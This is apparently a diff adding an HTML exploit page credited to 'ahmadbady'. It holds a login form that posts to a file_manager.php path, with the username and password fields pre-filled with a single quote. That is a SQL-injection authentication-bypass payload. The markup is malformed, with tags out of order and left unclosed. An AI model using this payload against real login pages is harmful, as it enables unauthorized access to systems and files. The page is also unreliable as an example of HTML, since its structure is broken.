@@ -1,0 +1,27 @@
+
+&lt;/html&gt;
+&lt;/style&gt;&lt;/head&gt;
+&lt;h2&gt;coded by ahmadbady&lt;/h2&gt;
+&lt;body&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;div class=&quot;login&quot;&gt;
+&lt;div style=&quot;color:red&quot; align=&quot;center&quot;&gt;&lt;/div&gt;
+&lt;form id=&quot;login_form&quot; name=&quot;login_form&quot; method=&quot;post&quot; action=&quot;/path/file_manager.php&quot;&gt;
+&lt;table border=&quot;0&quot; align=&quot;center&quot; cellpadding=&quot;4&quot; cellspacing=&quot;0&quot; bgcolor=&quot;#FFFFFF&quot; style=&quot;border:1px solid #999999; padding:10px&quot;&gt;
+&lt;tr&gt;
+&lt;td align=&quot;right&quot;&gt;Username:&lt;/td&gt;
+&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; value=&quot;&#039;&quot;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td align=&quot;right&quot;&gt;Password:&lt;/td&gt;
+&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; value=&quot;&#039;&quot;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan=&quot;2&quot; align=&quot;right&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;button&quot; id=&quot;button&quot; value=&quot;Login »&quot; /&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;input name=&quot;login&quot; type=&quot;hidden&quot; value=&quot;login&quot; /&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
